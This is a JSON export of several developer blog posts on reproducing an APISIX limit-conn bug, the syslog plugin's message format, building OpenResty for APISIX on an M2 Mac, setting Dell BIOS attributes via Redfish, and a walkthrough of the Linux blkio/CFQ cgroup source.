[{"title":"limit-conn report error attribute does not exist","path":"/2023/07/10/reproduce-apisix-bug-9661/","content":"https://github.com/apache/apisix/pull/9663/files install dependsredisinstall redis and start the redis service 12345678910$ sudo apt install redis 100 [09:23:03][sudo] password for guohao:Reading package lists... DoneBuilding dependency tree... DoneReading state information... Doneredis is already the newest version (5:6.0.16-1ubuntu1).The following package was automatically installed and is no longer required: openjdk-11-jreUse &#x27;sudo apt autoremove&#x27; to remove it.0 upgraded, 0 newly installed, 0 to remove and 17 not upgraded. test the redis 12345$ redis-cli -h localhostlocalhost:6379&gt; set a testOKlocalhost:6379&gt; get a&quot;test&quot; enable APISIX stream proxyupdate the conf/config-default.yaml 123456789101112131415161718192021222324252627282930313233343536diff --git a/conf/config-default.yaml b/conf/config-default.yamlindex e40dc174..3d8dd4c4 100755--- a/conf/config-default.yaml+++ b/conf/config-default.yaml@@ -73,15 +73,15 @@ apisix: # radixtree_uri_with_parameter: similar to radixtree_uri but match URI with parameters. See https://github.com/api7/lua-resty-radixtree/#parameters-in-path for more details. ssl: radixtree_sni # radixtree_sni: match route by SNI- # stream_proxy: # TCP/UDP L4 proxy- # only: true # Enable L4 proxy only without L7 proxy.- # tcp:- # - addr: 9100 # Set the TCP proxy listening ports.- # tls: true- # - addr: &quot;127.0.0.1:9101&quot;- # udp: # Set the UDP proxy listening ports.- # - 9200- # - &quot;127.0.0.1:9201&quot;+ stream_proxy: # TCP/UDP L4 proxy+ only: true # Enable L4 proxy only without L7 proxy.+ tcp:+ - addr: 9100 # Set the TCP proxy listening ports.+ tls: true+ - addr: &quot;127.0.0.1:9101&quot;+ udp: # Set the UDP proxy listening ports.+ - 9200+ - &quot;127.0.0.1:9201&quot; # dns_resolver: # If not set, read from `/etc/resolv.conf` # - 1.1.1.1@@ -141,7 +141,7 @@ nginx_config: # Config for render the template to generate n # user: root # Set the execution user of the worker process. This is only # effective if the master process runs with super-user privileges. error_log: logs/error.log # Location of the error log.- error_log_level: warn # Logging level: info, debug, notice, warn, error, crit, alert, or emerg.+ error_log_level: debug # Logging level: info, debug, notice, warn, error, crit, alert, or emerg. worker_processes: auto # Automatically determine the optimal number of worker processes based create proxycreate a proxy and enable the limit-conn plugin with conn 1. 1234567891011121314151617181920curl http://127.0.0.1:9180/apisix/admin/stream_routes/1 -H &#x27;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#x27; -X PUT -d &#x27;&#123; &quot;plugins&quot;: &#123; &quot;limit-conn&quot;: &#123; &quot;conn&quot;: 5, &quot;burst&quot;: 0, &quot;default_conn_delay&quot;: 0.1, &quot;rejected_code&quot;: 503, &quot;key_type&quot;: &quot;var&quot;, &quot;key&quot;: &quot;remote_addr&quot; &#125; &#125;, &quot;upstream&quot;: &#123; &quot;type&quot;: &quot;none&quot;, &quot;nodes&quot;: &#123; &quot;127.0.0.1:6379&quot;: 1 &#125; &#125;&#125;&#x27; reload the APISIX instance 123456$ make reload [09:24:37][ info ] reload -&gt; [ Start ]/home/guohao/apisix/bin/apisix reload/usr/local/openresty//luajit/bin/luajit ./apisix/cli/apisix.lua reloadWarning! Current maximum number of open file descriptors [1024] is not greater than 1024, please increase user limits by execute &#x27;ulimit -n &lt;new user limits&gt;&#x27; , otherwise the performance is low.[ info ] reload -&gt; [ Done ] test the proxytest the stream proxy 123456789$ 2023/07/10 18:35:08 [info] 40958#1379024: *542041 [lua] timers.lua:39: run timer[plugin#server-info], context: ngx.timer2023/07/10 18:35:08 [info] 40956#1379020: *541986 client disconnected, bytes from/to client:47/171634, bytes from/to upstream:171634/472023/07/10 18:35:08 [info] 40956#1379020: *541986 stream [lua] init.lua:1114: stream_log_phase(): enter stream_log_phase while proxying connection, client: 127.0.0.1, server: 127.0.0.1:9101, upstream: &quot;127.0.0.1:6379&quot;, bytes from/to client:47/171634, bytes from/to upstream:171634/02023/07/10 18:35:08 [debug] 40956#1379020: *541986 stream [lua] init.lua:125: phase_func(): request latency is nil2023/07/10 18:35:09 [info] 40958#1379024: *542073 [lua] timers.lua:39: run timer[plugin#server-info], context: ngx.timer [09:24:53]localhost:9101&gt; set key testOKlocalhost:9101&gt; get key&quot;test&quot; can’t reproduce the error log. 1234...2023/07/10 09:26:19 [info] 6971#6971: *242376 stream [lua] init.lua:1114: stream_log_phase(): enter stream_log_phase while proxying connection, client: 127.0.0.1, server: 127.0.0.1:9101, upstream: &quot;127.0.0.1:6379&quot;, bytes from/to client:117/18626, bytes from/to upstream:18626/02023/07/10 09:26:19 [debug] 6971#6971: *242376 stream [lua] init.lua:125: phase_func(): request latency is nil... update the config-default.yaml again. 1234567-# xrpc:-# protocols:-# - name: pingpong+xrpc:+ protocols:+ - name: redis+ and create a router again 1234567891011121314151617181920212223$ curl http://127.0.0.1:9180/apisix/admin/stream_routes/1 -H &#x27;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#x27; -X PUT -d &#x27;&#123; &quot;plugins&quot;: &#123; &quot;limit-conn&quot;: &#123; &quot;conn&quot;: 5, &quot;burst&quot;: 0, &quot;default_conn_delay&quot;: 0.1, &quot;rejected_code&quot;: 503, &quot;key_type&quot;: &quot;var&quot;, &quot;key&quot;: &quot;remote_addr&quot; &#125; &#125;, &quot;upstream&quot;: &#123; &quot;type&quot;: &quot;none&quot;, &quot;nodes&quot;: &#123; &quot;127.0.0.1:6379&quot;: 1 &#125; &#125;, &quot;protocol&quot;: &#123; &quot;name&quot;: &quot;redis&quot; &#125;&#125;&#x27; and the log error 12345678...2023/07/10 18:30:34 [error] 40018#1373140: *526473 failed to run log_by_lua*: ...ohao/workspace/apisix/apisix/plugins/limit-conn/init.lua:122: attempt to perform arithmetic on field &#x27;request_time&#x27; (a nil value)stack traceback:\t...ohao/workspace/apisix/apisix/plugins/limit-conn/init.lua:122: in function &#x27;phase_func&#x27;\t/Users/guohao/workspace/apisix/apisix/plugin.lua:1134: in function &#x27;run_plugin&#x27;\t/Users/guohao/workspace/apisix/apisix/init.lua:1116: in function &#x27;stream_log_phase&#x27;\tlog_by_lua(nginx.conf:113):2: in main chunk while prereading client data, client: 127.0.0.1, server: 127.0.0.1:91012023/07/10 18:30:35 [info] 40020#1373151: *526570 [lua] timers.lua:39: run timer[plugin#server-info], context: ngx.timer At present, the reason for the two differences is unknown, and it takes time to look at the code.","tags":["lua"]},{"title":"syslog data format","path":"/2023/05/11/syslog-data-format/","content":"最近在学习一下 apisix, 发现他的日志插件很久很玄学，看上去不工作。测试一下发现果真是这样的。 debug然后就开始 debug 了，创建了一个 issues : syslog plugin looks doesn’t work 有个社区老哥很热心，第二天就给我发了 PR (好人啊🫠) Screenshot via Cisco 关键代码以下代码均复制从 apisix 项目中。 12345678910111213141516171819function _M.encode(facility, severity, hostname, appname, pid, project, logstore, access_key_id, access_key_secret, msg) local pri = (Facility[facility] * 8 + Severity[severity]) local t = log_util.get_rfc3339_zulu_timestamp() if not hostname then hostname = &quot;-&quot; end if not appname then appname = &quot;-&quot; end return &quot;&lt;&quot; .. pri .. &quot;&gt;1 &quot; .. t .. &quot; &quot; .. hostname .. &quot; &quot; .. appname .. &quot; &quot; .. pid .. &quot; - [logservice project=\\&quot;&quot; .. project .. &quot;\\&quot; logstore=\\&quot;&quot; .. logstore .. &quot;\\&quot; access-key-id=\\&quot;&quot; .. access_key_id .. &quot;\\&quot; access-key-secret=\\&quot;&quot; .. access_key_secret .. &quot;\\&quot;] &quot; .. msg .. &quot; &quot;endreturn _M 上面代码其实其实不太符合它的文件名rfc5424.lua, 里面有一些奇怪代码东西没有定义在 rfc 里面。不过热心老哥的 pr 里面修正了。","tags":["lua"]},{"title":"how to build apisix@MacBookM2","path":"/2023/05/10/build-self-apisix/","content":"this script will download the deps of apisix, and build the new openresty to /usr/local/openresty 1brew install openresty-openssl111 go lua@5.1 pcre2 pcre compile the openrestythe new openresty will apply some patchs from apisix project, and it can runing at M2 machine. Dont’t forget set the PATH var to keep the /usr/local/openresty/* path will find firstly. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199#!/usr/bin/env bashset -eversion=&quot;0.0.0&quot;OR_PREFIX=&quot;/usr/local/openresty&quot;lj_ver=&quot;2.1-20230119&quot;openresty_ver=&quot;1.21.4.1&quot;function install_openresty()&#123; rm -rf openresty-$&#123;openresty_ver&#125; if [ ! -f LuaJIT-$lj_ver.tar.gz ]; then wget &quot;https://github.com/openresty/luajit2/archive/v$lj_ver.tar.gz&quot; -O &quot;LuaJIT-$lj_ver.tar.gz&quot; fi tar -zxvf LuaJIT-$lj_ver.tar.gz &gt; /dev/null if [ ! -f openresty-$&#123;openresty_ver&#125;.tar.gz ]; then wget --no-check-certificate https://openresty.org/download/openresty-$&#123;openresty_ver&#125;.tar.gz fi tar -zxvpf openresty-$&#123;openresty_ver&#125;.tar.gz &gt; /dev/null rm -rf openresty-$&#123;openresty_ver&#125;/bundle/LuaJIT-$lj_ver mv luajit2-$lj_ver openresty-$&#123;openresty_ver&#125;/bundle/ return 0&#125;function clone_repo() &#123; local repos=( &quot;ngx_multi_upstream_module&quot; &quot;mod_dubbo&quot; &quot;apisix-nginx-module&quot; &quot;wasm-nginx-module&quot; &quot;lua-var-nginx-module&quot; &quot;grpc-client-nginx-module&quot; &quot;amesh&quot; ) echo &quot;cloning repos&quot; if [ &quot;$1&quot; == &quot;update&quot; ]; then for repo in &quot;$&#123;repos[@]&#125;&quot;; do if [ -d &quot;$repo&quot; ]; then echo &quot;updating $repo&quot; pushd &quot;$repo&quot; git pull popd else git clone &quot;https://github.com/api7/$repo.git&quot; || exit 1 fi done else for repo in &quot;$&#123;repos[@]&#125;&quot;; do if [ ! -d &quot;$repo&quot; ]; then git clone &quot;https://github.com/api7/$repo.git&quot; || exit 1 fi done fi return 0&#125;function patch_openresty() &#123; pushd ngx_multi_upstream_module || exit 1 ./patch.sh ../openresty-$&#123;openresty_ver&#125; popd pushd apisix-nginx-module/patch || exit 1 ./patch.sh ../../openresty-$&#123;openresty_ver&#125; popd return 0&#125;function build_openresty() &#123; pushd openresty-$&#123;openresty_ver&#125; || exit 1 luajit_xcflags=$&#123;luajit_xcflags:=&quot;-DLUAJIT_NUMMODE=2 -DLUAJIT_ENABLE_LUA52COMPAT&quot;&#125; grpc_engine_path=&quot;-DNGX_GRPC_CLI_ENGINE_PATH=$OR_PREFIX/libgrpc_engine.so -DNGX_HTTP_GRPC_CLI_ENGINE_PATH=$OR_PREFIX/libgrpc_engine.so&quot; cc_opt=$&#123;cc_opt:&quot;&quot;&#125; ld_opt=$&#123;ld_opt:&quot;&quot;&#125; ./configure --prefix=&quot;$OR_PREFIX&quot; \\ --with-cc-opt=&quot;-DAPISIX_BASE_VER=$version $grpc_engine_path -I/opt/homebrew/opt/openresty-openssl111/include $cc_opt&quot; \\ --with-ld-opt=&quot;-Wl,-rpath,$OR_PREFIX/wasmtime-c-api/lib -L/opt/homebrew/opt/openresty-openssl111/lib $ld_opt&quot; \\ --add-module=../mod_dubbo \\ --add-module=../ngx_multi_upstream_module \\ --add-module=../apisix-nginx-module \\ --add-module=../apisix-nginx-module/src/stream \\ --add-module=../apisix-nginx-module/src/meta \\ --add-module=../wasm-nginx-module \\ --add-module=../lua-var-nginx-module \\ --add-module=../grpc-client-nginx-module \\ --with-poll_module \\ --with-pcre-jit \\ --without-http_rds_json_module \\ --without-http_rds_csv_module \\ --without-lua_rds_parser \\ --with-stream \\ --with-stream_ssl_module \\ --with-stream_ssl_preread_module \\ --with-http_v2_module \\ --without-mail_pop3_module \\ --without-mail_imap_module \\ --without-mail_smtp_module \\ --with-http_stub_status_module \\ --with-http_realip_module \\ --with-http_addition_module \\ --with-http_auth_request_module \\ --with-http_secure_link_module \\ --with-http_random_index_module \\ --with-http_gzip_static_module \\ --with-http_sub_module \\ --with-http_dav_module \\ --with-http_flv_module \\ --with-http_mp4_module \\ --with-http_gunzip_module \\ --with-threads \\ --with-compat \\ --with-luajit-xcflags=&quot;$luajit_xcflags&quot; \\ $no_pool_patch \\ -j`nproc` make -j`nproc` sudo make install popd&#125;function install_wasmtime() &#123; pushd wasm-nginx-module || exit 1 if [ ! -d lib/ ]; then ./install-wasmtime.sh fi popd return 0&#125;function install_api7_module() &#123; if [ ! -d /usr/local/openresty/lualib/resty/apisix/stream/xrpc ]; then pushd apisix-nginx-module || exit 1 sudo OPENRESTY_PREFIX=&quot;$OR_PREFIX&quot; make install popd fi if [ ! -d /usr/local/openresty/wasmtime-c-api/ ]; then pushd wasm-nginx-module || exit 1 sudo OPENRESTY_PREFIX=&quot;$OR_PREFIX&quot; make install popd fi pushd grpc-client-nginx-module/grpc-engine/ go build -o libgrpc_engine.so -buildmode=c-shared main.go sudo install -m 664 ./libgrpc_engine.so /usr/local/openresty sudo install -m 664 ../lib/resty/*.lua /usr/local/openresty/lualib/resty/ popd&#125;function main() &#123; if [ $(type -P nproc) == &quot;&quot; ]; then echo &quot;need install nproc&quot; exit 1 fi case &quot;$1&quot; in &quot;install&quot;) echo &quot;new install for dev apisix&quot; if [ -d ./build-apisix-dev ]; then pushd ./build-apisix-dev else mkdir ./build-apisix-dev pushd ./build-apisix-dev fi clone_repo install_openresty install_wasmtime patch_openresty build_openresty install_api7_module popd ;; &quot;update&quot;) echo &quot;only clone repo&quot; clone_repo update ;; *) echo &quot;only support install/repo&quot; exit 1 ;; esac&#125;main &quot;$@&quot; install apisixbefore to running apisix, you should install some packages by yourself. just clone the repo from apache/apisix 1234~/w/apisix *master&gt; git remote show origin* remote origin Fetch URL: git@github.com:apache/apisix.git Push URL: git@github.com:apache/apisix.git and try to make deps &amp;&amp; make run command.","tags":["k8s"]},{"title":"update BIOS attr by redfish","path":"/2022/09/03/update-bios-by-redfish/","content":"这个 post 来自于早起为开发裸金属管理平台和的核心组建之一的 bmc-server. bmc-server 允许以 RESTful API 的形式去操作物理机的带外管理。 其中有个关键功能就是支持用户修改机器的 BISO 的熟悉，其 POC 如下: DELL 厂商案例bios set request, 其中用户名密码就是厂商的默认配置。 12redfishtool -u root -p calvin -r 192.168.156.16 raw PATCH /redfish/v1/Systems/System.Embedded.1/Bios/Settings -d &#x27;&#123;&quot;Attributes&quot;:&#123;&quot;SysProfile&quot;:&quot;PerfPerWattOptimizedOs&quot;,&quot;ProcPwrPerf&quot;:&quot;OsDbpm&quot;,&quot;ProcTurboMode&quot;:&quot;Enabled&quot;,&quot;MonitorMwait&quot;:&quot;Enabled&quot;&#125;,&quot;@Redfish.SettingsApplyTime&quot;:&#123;&quot;ApplyTime&quot;:&quot;OnReset&quot;&#125;&#125;&#x27;redfishtool -u root -p calvin -r 192.168.156.16 raw POST /redfish/v1/Systems/System.Embedded.1/Actions/ComputerSystem.Reset -d &#x27;&#123;&quot;ResetType&quot;:&quot;PowerCycle&quot;&#125;&#x27; 上面这个redfishtool等价于下面的 curl 指令。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051curl -X PATCH -k -v -H &quot;Authorization: Basic cm9vdDpjYWx2aW4=&quot; -H &quot;Accept: application/json&quot; -H &quot;Content-Type: application/json&quot; https://192.168.156.16/redfish/v1/Systems/System.Embedded.1/Bios/Settings -d &#x27;&#123;&quot;Attributes&quot;:&#123;&quot;SysProfile&quot;:&quot;PerfPerWattOptimizedOs&quot;,&quot;ProcPwrPerf&quot;:&quot;OsDbpm&quot;,&quot;ProcTurboMode&quot;:&quot;Enabled&quot;,&quot;MonitorMwait&quot;:&quot;Enabled&quot;&#125;&#125;&#x27;whoami: cannot find name for user ID 1007* Trying 192.168.156.16:443...* TCP_NODELAY set* Connected to 192.168.156.16 (192.168.156.16) port 443 (#0)* ALPN, offering h2* ALPN, offering http/1.1* successfully set certificate verify locations:* CAfile: /etc/ssl/certs/ca-certificates.crt CApath: /etc/ssl/certs* TLSv1.3 (OUT), TLS handshake, Client hello (1):* TLSv1.3 (IN), TLS handshake, Server hello (2):* TLSv1.2 (IN), TLS handshake, Certificate (11):* TLSv1.2 (IN), TLS handshake, Server key exchange (12):* TLSv1.2 (IN), TLS handshake, Server finished (14):* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):* TLSv1.2 (OUT), TLS handshake, Finished (20):* TLSv1.2 (IN), TLS handshake, Finished (20):* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384* ALPN, server accepted to use http/1.1* Server certificate:* subject: C=US; ST=Texas; L=Round Rock; O=Dell Inc.; OU=Remote Access Group; CN=idrac-SVCTAG; emailAddress=support@dell.com* start date: Oct 20 17:43:00 2021 GMT* expire date: Oct 21 17:43:00 2031 GMT* issuer: C=US; ST=Texas; L=Round Rock; O=Dell Inc.; OU=Remote Access Group; CN=idrac-SVCTAG; emailAddress=support@dell.com* SSL certificate verify result: self signed certificate (18), continuing anyway.&gt; PATCH /redfish/v1/Systems/System.Embedded.1/Bios/Settings HTTP/1.1&gt; Host: 192.168.156.16&gt; User-Agent: curl/7.68.0&gt; Authorization: Basic cm9vdDpjYWx2aW4=&gt; Accept: application/json&gt; Content-Type: application/json&gt; Content-Length: 128&gt;* upload completely sent off: 128 out of 128 bytes* Mark bundle as not supporting multiuse&lt; HTTP/1.1 200 OK&lt; Date: Thu, 28 Apr 2022 19:51:52 GMT&lt; Server: Apache&lt; OData-Version: 4.0&lt; Access-Control-Allow-Origin: *&lt; Cache-Control: no-cache&lt; X-Frame-Options: DENY&lt; Strict-Transport-Security: max-age=63072000; includeSubDomains; preload&lt; Content-Length: 1579&lt; Vary: Accept-Encoding&lt; Content-Type: application/json;odata.metadata=minimal;charset=utf-8&lt;&#123;&quot;error&quot;:&#123;&quot;@Message.ExtendedInfo&quot;:[&#123;&quot;Message&quot;:&quot;Unable to modify the attribute because the attribute is read-only and depends on other attributes.&quot;,&quot;MessageArgs&quot;:[&quot;MonitorMwait&quot;],&quot;MessageArgs@odata.count&quot;:1,&quot;MessageId&quot;:&quot;IDRAC.2.4.SYS410&quot;,&quot;RelatedProperties&quot;:[&quot;#/Attributes/MonitorMwait&quot;],&quot;RelatedProperties@odata.count&quot;:1,&quot;Resolution&quot;:&quot;Verify if the attribute has dependency on other attributes and retry the operation. To verify, view the attribute registry based on the type of resource.&quot;,&quot;Severity&quot;:&quot;Warning&quot;&#125;,&#123;&quot;Message&quot;:&quot;Unable to modify the attribute because the attribute is read-only and depends on other attributes.&quot;,&quot;MessageArgs&quot;:[&quot;ProcPwrPerf&quot;],&quot;MessageArgs@odata.count&quot;:1,&quot;MessageId&quot;:&quot;IDRAC.2.4.SYS410&quot;,&quot;RelatedProperties&quot;:[&quot;#/Attributes/ProcPwrPerf&quot;],&quot;RelatedProperties@odata.count&quot;:1,&quot;Resolution&quot;:&quot;Verify if the attribute has dependency on other attributes and retry the operation. To verify, view the attribute registry based on the type of resource.&quot;,&quot;Severity&quot;:&quot;Warning&quot;&#125;,&#123;&quot;Message&quot;:&quot;Unable to modify the attr* Connection #0 to host 192.168.156.16 left intactibute because the attribute is read-only and depends on other attributes.&quot;,&quot;MessageArgs&quot;:[&quot;ProcTurboMode&quot;],&quot;MessageArgs@odata.count&quot;:1,&quot;MessageId&quot;:&quot;IDRAC.2.4.SYS410&quot;,&quot;RelatedProperties&quot;:[&quot;#/Attributes/ProcTurboMode&quot;],&quot;RelatedProperties@odata.count&quot;:1,&quot;Resolution&quot;:&quot;Verify if the attribute has dependency on other attributes and retry the operation. To verify, view the attribute registry based on the type of resource.&quot;,&quot;Severity&quot;:&quot;Warning&quot;&#125;],&quot;code&quot;:&quot;Base.1.7.GeneralError&quot;,&quot;message&quot;:&quot;A general error has occurred. See ExtendedInfo for more information&quot;&#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950curl -k -v -H &quot;Authorization: Basic cm9vdDpjYWx2aW4=&quot; -H &quot;Accept: application/json&quot; -H &quot;Content-Type: application/json&quot; https://192.168.156.16/redfish/v1/Systems/System.Embedded.1/Bios/Settingswhoami: cannot find name for user ID 1007* Trying 192.168.156.16:443...* TCP_NODELAY set* Connected to 192.168.156.16 (192.168.156.16) port 443 (#0)* ALPN, offering h2* ALPN, offering http/1.1* successfully set certificate verify locations:* CAfile: /etc/ssl/certs/ca-certificates.crt CApath: /etc/ssl/certs* TLSv1.3 (OUT), TLS handshake, Client hello (1):* TLSv1.3 (IN), TLS handshake, Server hello (2):* TLSv1.2 (IN), TLS handshake, Certificate (11):* TLSv1.2 (IN), TLS handshake, Server key exchange (12):* TLSv1.2 (IN), TLS handshake, Server finished (14):* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):* TLSv1.2 (OUT), TLS handshake, Finished (20):* TLSv1.2 (IN), TLS handshake, Finished (20):* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384* ALPN, server accepted to use http/1.1* Server certificate:* subject: C=US; ST=Texas; L=Round Rock; O=Dell Inc.; OU=Remote Access Group; CN=idrac-SVCTAG; emailAddress=support@dell.com* start date: Oct 20 17:43:00 2021 GMT* expire date: Oct 21 17:43:00 2031 GMT* issuer: C=US; ST=Texas; L=Round Rock; O=Dell Inc.; OU=Remote Access Group; CN=idrac-SVCTAG; emailAddress=support@dell.com* SSL certificate verify result: self signed certificate (18), continuing anyway.&gt; GET /redfish/v1/Systems/System.Embedded.1/Bios/Settings HTTP/1.1&gt; Host: 192.168.156.16&gt; User-Agent: curl/7.68.0&gt; Authorization: Basic cm9vdDpjYWx2aW4=&gt; Accept: application/json&gt; Content-Type: application/json&gt;* Mark bundle as not supporting multiuse&lt; HTTP/1.1 200 OK&lt; Date: Thu, 28 Apr 2022 19:48:10 GMT&lt; Server: Apache&lt; Link: &lt;/redfish/v1/Schemas/Bios.v1_1_0.json&gt;;rel=describedby&lt; Allow: GET,HEAD,PATCH&lt; OData-Version: 4.0&lt; Cache-Control: no-cache&lt; X-Frame-Options: DENY&lt; Strict-Transport-Security: max-age=63072000; includeSubDomains; preload&lt; Content-Length: 760&lt; Vary: Accept-Encoding&lt; Content-Type: application/json;odata.metadata=minimal;charset=utf-8&lt;* Connection #0 to host 192.168.156.16 left intact&#123;&quot;@odata.context&quot;:&quot;/redfish/v1/$metadata#Bios.Bios&quot;,&quot;@odata.id&quot;:&quot;/redfish/v1/Systems/System.Embedded.1/Bios/Settings&quot;,&quot;@odata.type&quot;:&quot;#Bios.v1_1_0.Bios&quot;,&quot;Id&quot;:&quot;Settings&quot;,&quot;Name&quot;:&quot;BIOS Configuration Pending Settings&quot;,&quot;Description&quot;:&quot;BIOS Configuration Pending Settings. These settings will be applied on next system reboot.&quot;,&quot;AttributeRegistry&quot;:&quot;BiosAttributeRegistry.v1_0_3&quot;,&quot;Attributes&quot;:&#123;&#125;,&quot;Actions&quot;:&#123;&quot;Oem&quot;:&#123;&quot;DellManager.v1_0_0#DellManager.ClearPending&quot;:&#123;&quot;target&quot;:&quot;/redfish/v1/Systems/System.Embedded.1/Bios/Settings/Actions/Oem/DellManager.ClearPending&quot;&#125;&#125;&#125;,&quot;Oem&quot;:&#123;&quot;Dell&quot;:&#123;&quot;@odata.context&quot;:&quot;/redfish/v1/$metadata#DellManager.DellManager&quot;,&quot;@odata.type&quot;:&quot;#DellManager.v1_1_0.DellManager&quot;,&quot;Jobs&quot;:&#123;&quot;@odata.id&quot;:&quot;/redfish/v1/Managers/iDRAC.Embedded.1/Oem/Dell/Jobs&quot;&#125;&#125;&#125;&#125; 对应的 golang 的关键代码如下： 123456789101112func (m *Manufacture) SetBIOSAttribute(attrs map[string]any) error &#123;\t_, err := m.Machine.Do(http.MethodPatch, &quot;/redfish/v1/Systems/System.Embedded.1/Bios/Settings&quot;, http.Header&#123;&#125;, map[string]any&#123; &quot;Attributes&quot;: attrs, &quot;@Redfish.SettingsApplyTime&quot;: map[string]any&#123;&quot;ApplyTime&quot;: &quot;OnReset&quot;&#125;,\t&#125;, nil)\tif err != nil &#123; log.Logger().Error(err.Error()) return err\t&#125;\treturn nil&#125;"},{"title":"blkio 源码分析","path":"/2021/05/11/blk-io-2/","content":"背景之前在发现线上 blkio cgroup 层级关系中 io_merged 文件内容不符合预期，所以才有这一篇源码分析。 4.9 kernel初始化我们都知道 blkio 是基于 IO 的 scheduler 的实现的, 基于线上的唯一的一块SATA盘的且调度算法是 cfq, 读一下 cfq 实现 blkio 的相关代码,首先到 cfq 的模块的入口函数 cfq_init()移除了一些错误处理相关的代码. 123456789101112131415161718192021static int __init cfq_init(void)&#123;\tint ret;#ifdef CONFIG_CFQ_GROUP_IOSCHED\tret = blkcg_policy_register(&amp;blkcg_policy_cfq); // 如果 CONFIG_CFQ_GROUP_IOSCHED , 也就是启动 blkio 需要的内核选项, 这个变量的位置就是\tif (ret) return ret;#else\tcfq_group_idle = 0;#endif\tret = -ENOMEM;\tcfq_pool = KMEM_CACHE(cfq_queue, 0); if (!cfq_pool) goto err_pol_unreg;\tret = elv_register(&amp;iosched_cfq); // ...实现调度算法的 callback func 即可\tif (ret) goto err_free_pool;... blkcg_policy_register(&amp;blkcg_policy_cfq) 中的 blkcg_policy_cfq 变量的初始化如下. 其中的 cfq_blkcg_legacy_files 就是需要特别关注点的他在用户态以文件形式体现出来. 1234567891011121314151617#ifdef CONFIG_CFQ_GROUP_IOSCHEDstatic struct blkcg_policy blkcg_policy_cfq = &#123;\t.dfl_cftypes = cfq_blkcg_files, // 这里变量是个只有只有一个 .name = &quot;weight&quot;, .legacy_cftypes = cfq_blkcg_legacy_files, // 这些是主要的用户态 blkio 文件 .cpd_alloc_fn = cfq_cpd_alloc, // 有 fn 是回调函数, 没有的就是用户态文件\t.cpd_init_fn = cfq_cpd_init,\t.cpd_free_fn = cfq_cpd_free,\t.cpd_bind_fn = cfq_cpd_bind,\t.pd_alloc_fn = cfq_pd_alloc,\t.pd_init_fn = cfq_pd_init,\t.pd_offline_fn = cfq_pd_offline,\t.pd_free_fn = cfq_pd_free,\t.pd_reset_stats_fn\t= cfq_pd_reset_stats,&#125;;#endif 其实我们在 Linux 中看的 blkio.io_merged 就是这里的这个变量产生的, 其中 blkio 是 sub system 名字. 在下面的代码中会拼凑出. 123456789static struct cftype cfq_blkcg_legacy_files[] = &#123;\t/* on root, weight is mapped to leaf_weight */...\t&#123; .name = &quot;io_merged&quot;, .private = offsetof(struct cfq_group, stats.merged), .seq_show = cfqg_print_rwstat,\t&#125;,... 看一下 blkio 的 cg policy 是如何注册的这些信息中, 虽然对其一部分逻辑还没有完全搞懂,但是我知道了这个随着 CFQ 一起初始化了,在内核空间中维护一些变量. 123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * blkcg_policy_register - register a blkcg policy * @pol: blkcg policy to register * * Register @pol with blkcg core. Might sleep and @pol may be modified on * successful registration. Returns 0 on success and -errno on failure. */int blkcg_policy_register(struct blkcg_policy *pol)&#123;\tstruct blkcg *blkcg;\tint i, ret;....\t/* register @pol */\tpol-&gt;plid = i;\tblkcg_policy[pol-&gt;plid] = pol;\t/* allocate and install cpd&#x27;s */\tif (pol-&gt;cpd_alloc_fn) &#123; list_for_each_entry(blkcg, &amp;all_blkcgs, all_blkcgs_node) &#123; struct blkcg_policy_data *cpd; cpd = pol-&gt;cpd_alloc_fn(GFP_KERNEL);... blkcg-&gt;cpd[pol-&gt;plid] = cpd; // 看到现在对这些不是很明白 cpd-&gt;blkcg = blkcg; cpd-&gt;plid = pol-&gt;plid; pol-&gt;cpd_init_fn(cpd); &#125;\t&#125;..\t/* everything is in place, add intf files for the new policy */\tif (pol-&gt;dfl_cftypes)// cgroup_add_dfl_cftypes 函数描述 add an array of cftypes for default hierarchy // Similar to cgroup_add_cftypes() but the added files are only used for the default hierarchy. WARN_ON(cgroup_add_dfl_cftypes(&amp;io_cgrp_subsys, pol-&gt;dfl_cftypes));\tif (pol-&gt;legacy_cftypes)// cgroup_add_legacy_cftypes - add an array of cftypes for legacy hierarchies// Similar to cgroup_add_cftypes() but the added files are only used for the legacy hierarchies.// 其实到这里我们知道这个地方就是处理文件初始化的地方, 这里说的是文件初始化不包含内容正确.// 这里在 cgroup fs blkio 中创建文件的地方, 拼接名字也是在这里完成的. WARN_ON(cgroup_add_legacy_cftypes(&amp;io_cgrp_subsys, pol-&gt;legacy_cftypes));.... // 移除一些错误处理的代码,主要是内核分配内存失败释放内存的逻辑EXPORT_SYMBOL_GPL(blkcg_policy_register); 下面这个就是按照内核提供的 cgroup 框架实现的一个 controller group 的 sub system 名字叫 blkio, 其实 cgroup 框架的抽象也能猜测行为, 如果猜的不对可以看 kernel/cgroup.c 中的调用方式. 123456789101112struct cgroup_subsys io_cgrp_subsys = &#123;\t.css_alloc = blkcg_css_alloc, // css alloc = cgroup subsystem 的 内存分配\t.css_offline = blkcg_css_offline, // 就是下掉当前 sub system, 其实没有怎么在生产中见过下掉 sub system\t.css_free = blkcg_css_free, // 释放内存\t.can_attach = blkcg_can_attach, // 从 https://elixir.bootlin.com/linux/v4.9.10/source/kernel/cgroup.c#L5179 主要是和管理当前`层级`task 的\t.bind = blkcg_bind, // 文件系统里面的 mount bind\t.dfl_cftypes = blkcg_files, // 涉及的用户态文件\t.legacy_cftypes = blkcg_legacy_files, // 涉及的用户态文件\t.legacy_name = &quot;blkio&quot;,...&#125;;EXPORT_SYMBOL_GPL(io_cgrp_subsys); 以上基本上将 blkio 在 cfq 实现的初始化. 回头看 io_merged 存在内容为空问题cgroup blkio 看一下 blkio.io_merged 这个文件写的过程. linux vfs 1. 